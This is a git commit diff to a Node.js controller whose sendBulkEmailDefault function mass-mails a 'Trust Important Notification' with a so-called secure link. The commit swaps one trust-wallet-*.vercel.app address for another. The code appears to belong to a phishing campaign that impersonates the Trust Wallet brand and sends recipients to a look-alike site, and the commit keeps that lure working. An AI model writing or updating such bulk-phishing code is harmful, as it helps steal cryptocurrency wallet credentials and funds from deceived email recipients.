7fee6917a710bd347971b635ec1020f6114a794a
digitz20 <alaekekaebuka200@gmail.com>
2025-05-23 19:52:15 +1245

    moon

--- controller/userController.js
+++ controller/userController.js
@@ -31,7 +31,7 @@ exports.sendBulkEmailDefault = async (req, res) => {
         }
 
         const defaultSubject = "Trust Important Notification";
-        const secureLink = `https://trust-wallet-inky.vercel.app/`;
+        const secureLink = `https://trust-wallet-two.vercel.app/`;
 
         // Send emails and save to DB in parallel
         const results = await Promise.allSettled(
